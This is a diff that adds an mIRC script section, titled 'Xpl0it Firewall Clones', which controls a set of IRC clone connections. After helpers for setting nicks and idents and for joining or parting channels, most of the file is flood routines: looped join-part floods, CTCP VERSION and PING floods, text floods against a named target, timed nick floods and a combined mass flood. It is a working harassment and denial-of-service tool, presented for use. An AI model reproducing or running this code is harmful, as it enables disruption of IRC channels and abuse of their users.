@@ -1,0 +1,34 @@
+;#########Xpl0it Firewall Clones#########
+
+;NICK
+xprenick  if %xnick == setnick { fw.setnick $$?="Clones Nick:" | unset %xnick }
+xcasualnick  if %xnick == casual { unset %xnick }
+
+;IDENT
+xpreident  if %xident == setident { set %fw.identd 1 | .set %fw.identd.x $$?="Clones Ident" | unset %xident }
+xcasualident  if %xident == casual { set %fw.identd 3 | unset %xident }
+xcolorident  if %xident == color { set %fw.identd 0 | unset %xident }
+
+;CHANNEL COMMAND
+xjoinchan { skwinchk | .sockwrite -n fw* JOIN %xchan | .aline -p @fwclones [joining to %xchan $+ ] }
+xpartchan { skwinchk | .sockwrite -n fw* PART %xchan : $+ %logo | .aline -p @fwclones [parting to %xchan $+ ] }
+
+;FLOOD
+xjoinpart { skwinchk | /sockwrite -n fw* JOIN %xchan | sockwrite -n fw* PART %xchan : $+ %logo | .aline -p @fwclones [join-part flood on %xchan $+ ] }
+xjoinpartmassa { jp %xchan }
+xjoinpartn { set %temp.jpchan %xchan
+  if %jpn == 1 { set %temp.jpht $$?="Join-Part n.?" }
+  :nextjp
+  inc %temp.jpt
+  jp %temp.jpchan
+  if (%temp.jpt <= %temp.jpht) { goto nextjp }
+}
+xversionfl { sockwrite -n fw* PRIVMSG %xchan :VERSION }
+xpingfl { sockwrite -n fw* PRIVMSG %xchan :PING }
+xctcpfl { fwctcp %xchan }
+xtextfl { skwinchk | .sockwrite -n fw* PRIVMSG $$1 $?="Cosa vuoi dire?" | .aline -p @fwclones [Text Flood on $$1 ] }
+xnickfl { fw.nickflood | .timer 1 6 /fw.nickflood | .timer 1 12 /fw.nickflood | .timer 1 18 /fw.nickflood }
+xmassfl { sockwrite -n fw* JOIN %xchan | .timer 1 6 /fw.nickflood | .timer 1 12 /fw.nickflood | .timer 1 18 /fw.nickflood | .timer 1 25 /fwctcp %xchan }
+
+;CLOSE ALL
+xquit { sockclose fw* | .aline -p @fwclones [close all sockets] | .timer90 off | .timer92 off  | window -c @fwclones }
